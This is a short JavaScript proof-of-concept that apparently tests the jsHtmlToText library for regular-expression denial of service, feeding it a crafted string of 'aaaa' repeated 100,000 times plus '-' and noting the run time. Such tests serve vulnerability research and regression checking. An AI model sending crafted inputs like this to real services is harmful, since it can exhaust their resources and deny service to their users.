const htmlToText = require("./jsHtmlToText.js");

//Attack String :""+"aaaa"*100000+"-"
var str = "";
for (var i = 0; i < 100000; i++) {
  str += "aaaa";
}
str += "-";

var result = htmlToText(str, "");

// real    0m0.142s
// user    0m0.107s
// sys     0m0.011s
